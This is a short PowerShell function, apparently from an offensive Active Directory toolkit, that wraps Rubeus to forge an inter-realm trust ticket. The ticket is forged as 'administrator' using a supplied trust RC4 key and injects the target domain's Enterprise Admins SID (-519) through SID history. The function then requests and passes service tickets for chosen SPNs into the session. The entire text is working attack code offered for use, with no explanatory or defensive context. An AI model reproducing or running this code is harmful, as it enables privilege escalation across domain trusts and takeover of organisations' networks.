%dependency%

function Invoke-TrustTicket
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Rc4,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $From,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [String]
        $To,

        [Parameter(Position = 3)]
        [String]
        $SpnT
    )

    $dc1, $do1 = $From.Split(".", 2);
    $dc2, $do2 = $To.Split(".", 2);
    $FromSID = Get-DomainSID -Domain $do1;
    $ToSID = Get-DomainSID -Domain $do2;

    $output = [Rubeus.Program]::MainString("silver /user:administrator /domain:$do1 /service:krbtgt/$do2 /sid:$FromSID /rc4:$Rc4 /sids:$ToSID-519 /nowrap");
    Write-Host "$output`n";
    $tkt = ($output |select-string -pattern "      (do.*)" -Allmatches).Matches.Groups[-1].value;
    Foreach( $spntt in $SpnT.Split(",") ) {
        [Rubeus.Program]::MainString("asktgs /service:$spntt /dc:$To /ptt /ticket:$tkt")
    }
}
